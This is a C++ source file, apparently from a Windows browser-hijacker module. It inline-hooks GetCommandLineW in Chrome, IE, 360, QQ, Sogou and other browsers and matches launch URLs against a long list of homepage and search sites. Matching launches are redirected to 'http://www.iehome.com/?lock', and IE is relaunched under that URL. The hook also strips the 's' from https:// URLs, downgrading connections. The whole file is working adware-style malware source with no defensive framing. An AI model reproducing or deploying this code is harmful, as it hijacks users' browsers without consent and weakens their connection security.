#include "HTTPRedirect.h"

#include "FakeCommandLine.h"

#include "pcre\pcre.h"

#include "HookControl\HookHelp.h"
#include "HookControl\InlineHook.h"
#include "HookControl\IATHook.h"

namespace {
#define _W(_str)		L##_str
#define _S(_str)		_str
#define MAX_OVECCOUNT 0x30

	const wchar_t * ptszHitProcessNameLists[] = {
		_W("iexplore.exe")/* IE 核心浏览器*/,

		_W("liebao.exe")/* 猎豹 核心浏览器*/,
		_W("360se.exe")/* 360安全 核心浏览器*/,
		_W("360chrome.exe")/* 360极速 核心浏览器*/,
		_W("chrome.exe")/* Chrome 核心浏览器*/,
		_W("qqbrowser.exe")/* QQ 核心浏览器*/,
		_W("sogouexplorer.exe")/* 搜狗 核心浏览器*/,
		_W("baidubrowser.exe")/* 百度 核心浏览器*/, //会出现无法打开的情况
		_W("f1browser.exe")/* F1 核心浏览器*/,
		_W("2345explorer.exe")/* 2345 核心浏览器*/,

		_W("yidian.exe")/* 一点浏览器 湖南岳阳 应该是当地实名制公司的*/
	};
	const char * ptszHitRedirectURLLists[] = {
		_S("(?: |http[s]?://)hao\\.360\\.cn/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),

		_S("(?: |http[s]?://)www\\.duba\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),

		_S("(?: |http[s]?://)123\\.sogou\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
		_S("(?: |http[s]?://)www\\.sogou\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),

		_S("(?: |http[s]?://)www\\.2345\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),

		_S("(?: |http[s]?://)0\\.baidu\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
		_S("(?: |http[s]?://)www\\.baidu\\.com/*(?:home[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
		_S("(?: |http[s]?://)www\\.baidu\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),

		_S("(?: |http[s]?://)www\\.hao123\\.com/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),

		_S("\\.index66\\.com"),
		_S("pc918\\.net"),
		_S("interface\\.wx-media\\.com"),
		_S("index\\.icafevip\\.com"),
		_S("17dao\\.com"),
		_S("www\\.58fy\\.com"),
		_S("daohang\\.qq\\.com"),
		_S("www\\.wblove\\.com"),
		_S("www\\.v232\\.com"),
		_S("www\\.95browser\\.com"),
		_S("www\\.6461\\.cn"),
		_S("www\\.95soo\\.com"),
		_S("www\\.go890\\.com"),
		_S("www\\.wb12318\\.com"),
		_S("jl100\\.net"),
		_S("index\\.woai310\\.com"),
		_S("1234wu\\.com"),
		_S("123\\.org\\.cn"),
		_S("123\\.19so\\.cn"),
		_S("huo99\\.com"),
		_S("sogoulp\\.com"),
		_S("www\\.52wba\\.com"),
		_S("www\\.ld56\\.com"),
		_S("www\\.wb400\\.net"),
		_S("58aq\\.com"),
		_S("g-fox\\.cn"),
		_S("uc123\\.com"),
		_S("maxthon\\.cn"),
		_S("firefoxchina\\.cn"),
		_S("opera\\.com"),
		_S("hao\\.360\\.cn"),
		_S("so\\.360\\.cn"),
		_S("3600\\.com"),
		_S("duba\\.com"),
		_S("www\\.baidu\\.com"),
		_S("0\\.baidu\\.com"),
		_S("12318wh\\.com"),
		_S("19so\\.cn"),
		_S("917wb\\.com"),
		_S("wbindex\\.cn"),
		_S("jj123\\.com\\.cn"),
		_S("woai310\\.com"),
		_S("i8cs\\.com"),
		_S("v228\\.cn"),
		_S("www\\.2345\\.com"),
		_S("58ny\\.com"),
		_S("hao123\\.com"),
		_S("tao123\\.com"),
		_S("soso\\.com"),
		_S("123\\.sogou\\.com"),
		_S("www\\.sogou\\.com"),
		_S("ld56\\.com"),
		_S("16116\\.net"),
		_S("wz58\\.com"),
		_S("google\\.com"),
		_S("42\\.62\\.30\\.178"),
		_S("42\\.62\\.30\\.180"),
		_S("index\\.icafe66\\.com"),
		_S("kltest\\.bmywm\\.com"),
		_S("127.0.0.1:"),
		_S("localhost:")

	};

	typedef LPWSTR(WINAPI *__pfnGetCommandLineW) (VOID);

	UNICODE_STRING ustrCommandLine = { 0 };
	__pfnGetCommandLineW pfnGetCommandLineW = NULL;


	const wchar_t * __cdecl wcsistr(const wchar_t * str1, const wchar_t * str2)
	{
		const wchar_t *cp = (const wchar_t *)str1;
		const wchar_t *s1, *s2;
		wchar_t c1 = L'\0', c2 = L'\0';

		if (!*str2)
			return((const wchar_t *)str1);

		while (*cp)
		{
			s1 = cp;
			s2 = (const wchar_t *)str2;
			c1 = (*s1 >= 'a' && *s1 <= 'z') ? *s1 - ('a' - 'A') : *s1;
			c2 = (*s2 >= 'a' && *s2 <= 'z') ? *s2 - ('a' - 'A') : *s2;

			while (c1 && c2 && !(c1 - c2))
			{
				s1++, s2++;

				c1 = (*s1 >= 'a' && *s1 <= 'z') ? *s1 - ('a' - 'A') : *s1;
				c2 = (*s2 >= 'a' && *s2 <= 'z') ? *s2 - ('a' - 'A') : *s2;
			}

			if (!*s2)
				return(cp);

			cp++;
		}

		return(NULL);

	}

	typedef LONG(WINAPI *PNTQUERYINFORMATIONPROCESS)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

	inline PPEB GetCurrentProcessPEB()
	{
		return PPEB(__readfsdword(0x30));
	}

	inline PRTL_USER_PROCESS_PARAMETERS GetCurrentProcessParameters() {
		PPEB pProcessPEB = GetCurrentProcessPEB();

		if (NULL == pProcessPEB || NULL == pProcessPEB->ProcessParameters) {
			return NULL;
		}

		if (NULL == pProcessPEB->ProcessParameters->CommandLine.Buffer || NULL == pProcessPEB->ProcessParameters->ImagePathName.Buffer) {
			return NULL;
		}

		return pProcessPEB->ProcessParameters;
	}

	int GetParentProcessId(DWORD dwProcessId)
	{
		LONG                      status = 0;
		DWORD                     dwParentPID = 0;
		PROCESS_BASIC_INFORMATION pbi = { 0 };

		PNTQUERYINFORMATIONPROCESS NtQueryInformationProcess = (PNTQUERYINFORMATIONPROCESS)GetProcAddress(GetModuleHandle("ntdll"), "NtQueryInformationProcess");

		if (!NtQueryInformationProcess)
			return -1;

		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessId);

		if (NULL == hProcess) {
			return -1;
		}

		if (NT_SUCCESS(NtQueryInformationProcess(hProcess, ProcessBasicInformation, (PVOID)&pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL))) {
			dwParentPID = (DWORD)pbi.Reserved3;//InheritedFromUniqueProcessId
		}

		CloseHandle(hProcess);

		return dwParentPID;
	}

	bool GetProcessNameByProcessId(DWORD dwProcessID, LPWSTR pwszProcessName)
	{
		bool bIsFind = false;
		PROCESSENTRY32W pe32 = { 0 };
		HANDLE hProcessSnap = INVALID_HANDLE_VALUE;

		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		pe32.dwSize = sizeof(PROCESSENTRY32W);

		if (!Process32FirstW(hProcessSnap, &pe32))
			return NULL;

		do
		{
			if (pe32.th32ProcessID == dwProcessID)
			{
				bIsFind = true;
				wcscpy(pwszProcessName, pe32.szExeFile);
				break;
			}

			pe32.dwSize = sizeof(PROCESSENTRY32W);
		} while (Process32NextW(hProcessSnap, &pe32));

		CloseHandle(hProcessSnap);

		return bIsFind;
	}

	bool RegRead(HKEY hRootKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, BYTE   * pBuffer, size_t sizeBufferSize)
	{
		HKEY hKey;
		bool bIsOK = false;
		DWORD dwType = 0;
		DWORD dwBufferSize = sizeBufferSize;

		if (RegOpenKeyW(hRootKey, lpSubKey, &hKey) != ERROR_SUCCESS)
			return   false;

		if (RegQueryValueExW(hKey, lpValueName, NULL, &dwType, (LPBYTE)pBuffer, &dwBufferSize) == ERROR_SUCCESS) {//   成功 
			bIsOK = true;
		}

		RegCloseKey(hKey);

		return   bIsOK;
	}

	bool IsRedirectCommandLine(const wchar_t * pcwszCheckString) {
		bool bIsHit = false;
		pcre * pcreCompile = NULL;
		int nWatchOvectors[MAX_OVECCOUNT] = { 0 };

		char * pszCheckString = Common::WSTR2STR(pcwszCheckString, NULL);

		int nErroroffset = 0;
		const char * pcszErrorptr = NULL;

		pcreCompile = pcre_compile("^(?:\".|.):\\\\[^\"]+.exe\"? *$", PCRE_CASELESS, &pcszErrorptr, &nErroroffset, NULL);

		if (pcreCompile && pcre_exec(pcreCompile, NULL, pszCheckString, strlen(pszCheckString), 0, 0, nWatchOvectors, MAX_OVECCOUNT) >= 0) {
			free(pszCheckString);
			pcre_free(pcreCompile);
			Global::Log.PrintA(LOGOutputs, "[% 5u] Path Hit: %s", GetCurrentProcessId(), pszCheckString);
			return true;
		}

		for (int i = 0; i < count(ptszHitRedirectURLLists); i++) {

			pcreCompile = pcre_compile(ptszHitRedirectURLLists[i], PCRE_CASELESS, &pcszErrorptr, &nErroroffset, NULL);

			if (pcreCompile && pcre_exec(pcreCompile, NULL, pszCheckString, strlen(pszCheckString), 0, 0, nWatchOvectors, MAX_OVECCOUNT) >= 0) {

				bIsHit = true;
				Global::Log.PrintA(LOGOutputs, "[% 5u] Host Hit: %s", GetCurrentProcessId(), ptszHitRedirectURLLists[i]);
				break;

			}
		}

		free(pszCheckString);
		pcre_free(pcreCompile);

		return bIsHit;
	}

	bool GetUrlAssociationbyProtocol(const wchar_t * pcwszProtocolName, wchar_t * pwszProtocolCommandLine, size_t sizeBufferSize = 2048) {
		WCHAR wszOpenSubKey[MAX_PATH + 1] = { 0 };

		_swprintf(wszOpenSubKey, L"Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\%s\\UserChoice", pcwszProtocolName);

		if (false == RegRead(HKEY_CURRENT_USER, wszOpenSubKey, L"Progid", (BYTE *)pwszProtocolCommandLine, sizeBufferSize)
			&& false == RegRead(HKEY_LOCAL_MACHINE, wszOpenSubKey, L"Progid", (BYTE *)pwszProtocolCommandLine, sizeBufferSize)) {
			pwszProtocolCommandLine[0] = L'\0';
			return false;
		}

		_swprintf(wszOpenSubKey, L"Software\\Classes\\%s\\shell\\open\\command", pwszProtocolCommandLine);

		if (false == RegRead(HKEY_CURRENT_USER, wszOpenSubKey, NULL, (BYTE *)pwszProtocolCommandLine, sizeBufferSize)
			&& false == RegRead(HKEY_LOCAL_MACHINE, wszOpenSubKey, NULL, (BYTE *)pwszProtocolCommandLine, sizeBufferSize)) {
			pwszProtocolCommandLine[0] = L'\0';
			return false;
		}

		return true;
	}
}

LPWSTR WINAPI InlineGetCommandLineW(VOID)
{
	if (NULL != ustrCommandLine.Buffer) {
		return ustrCommandLine.Buffer;
	}

	PRTL_USER_PROCESS_PARAMETERS pProcessParameters = GetCurrentProcessParameters();

	if (NULL == pProcessParameters) {
		return (NULL == pfnGetCommandLineW) ? L"" : pfnGetCommandLineW();
	}

	if (ustrCommandLine.MaximumLength < pProcessParameters->CommandLine.Length) {

		ustrCommandLine.Length = 0;
		ustrCommandLine.MaximumLength = max(pProcessParameters->CommandLine.Length, pProcessParameters->CommandLine.MaximumLength) + 1024;

		if (NULL != ustrCommandLine.Buffer) {
			HeapFree(GetProcessHeap(), 0, ustrCommandLine.Buffer);
		}

		ustrCommandLine.Buffer = (LPWSTR)HeapAlloc(GetProcessHeap(), 0, sizeof(WCHAR) * ustrCommandLine.MaximumLength);
	}

	if (NULL != ustrCommandLine.Buffer) {
		ustrCommandLine.Length = pProcessParameters->CommandLine.Length;
		memcpy(ustrCommandLine.Buffer, pProcessParameters->CommandLine.Buffer, pProcessParameters->CommandLine.Length * sizeof(WCHAR));
	}

	for (LPCWSTR pcwszNextOffset = wcsistr(ustrCommandLine.Buffer, _W("https://")); pcwszNextOffset != NULL; pcwszNextOffset = wcsistr(pcwszNextOffset, _W("https://")))
	{
		memmove((LPWSTR)&pcwszNextOffset[4], &pcwszNextOffset[5], wcslen(pcwszNextOffset) * sizeof(WCHAR));
	}

	LPCWSTR pcwszNewParameter = L"http://www.iehome.com/?lock";
	LPWSTR pcwszStartCommandLine = pProcessParameters->CommandLine.Buffer;

	if (IsRedirectCommandLine(pcwszStartCommandLine)) {
		pcwszStartCommandLine = ustrCommandLine.Buffer;
		_swprintf(ustrCommandLine.Buffer, L"\"%s\" %s", pProcessParameters->ImagePathName.Buffer, pcwszNewParameter);
	}

	Global::Log.PrintW(LOGOutputs, L"[% 5u] New CMD: %s", GetCurrentProcessId(), pcwszStartCommandLine);
	return pcwszStartCommandLine;
}

bool Hook::StartCommandLineHook()
{
	bool bIsHook = false;
	PRTL_USER_PROCESS_PARAMETERS pProcessParameters = GetCurrentProcessParameters();

	if (NULL == pProcessParameters) {
		return false;
	}

	for (int i = 0; i < count(ptszHitProcessNameLists); i++) {
		if (NULL != wcsistr(pProcessParameters->ImagePathName.Buffer, ptszHitProcessNameLists[i]) && NULL == pfnGetCommandLineW) {
			bIsHook = HookControl::InlineHook(::GetCommandLineW, InlineGetCommandLineW, (void **)&pfnGetCommandLineW);
			break;
		}
	}

	Global::Log.PrintW(LOGOutputs, L"[% 5u] CMD: [%u]%s", GetCurrentProcessId(), bIsHook, pProcessParameters->CommandLine.Buffer);

#ifdef _DEBUG
	IsRedirectCommandLine(L"\"C:\\Program Files(x86)\\Google\\Chrome\\Application\\chrome.exe\" ");
#endif

	LPCWSTR pcwszNewParameter = NULL;
	LPCWSTR pcwszStartCommandLine = pProcessParameters->CommandLine.Buffer;
	LPCWSTR pcwszStartImagePathName = pProcessParameters->ImagePathName.Buffer;

	if (NULL != wcsistr(pcwszStartImagePathName, _W("\\iexplore.exe")) && IsRedirectCommandLine(pcwszStartCommandLine)) {
		pcwszNewParameter = L"http://www.iehome.com/?lock";
	}

	//////////////////////////////////////////////////////////////////////////////////////////////
	// 执行重定向

	if (NULL != pcwszNewParameter) {
		WCHAR wszProtocolCommandLine[1024 + 1] = { 0 };

		_swprintf(wszProtocolCommandLine, L"\"%s\" %s", pcwszStartImagePathName, pcwszNewParameter);

		bool bIsSuccess = false;
		STARTUPINFOW siStratupInfo = { 0 };
		PROCESS_INFORMATION piProcessInformation = { 0 };

		siStratupInfo.cb = sizeof(STARTUPINFO);

		Global::Log.PrintW(LOGOutputs, L"[% 5u] Redirect CMD: %s", GetCurrentProcessId(), wszProtocolCommandLine);

		if (FALSE == ::CreateProcessW(NULL, wszProtocolCommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &siStratupInfo, &piProcessInformation)) {
			return false;
		}

		ResumeThread(piProcessInformation.hThread);

		CloseHandle(piProcessInformation.hThread);
		CloseHandle(piProcessInformation.hProcess);

		::ExitProcess(0);
		::TerminateProcess(::GetCurrentProcess(), 0);
	}

	return true;
}
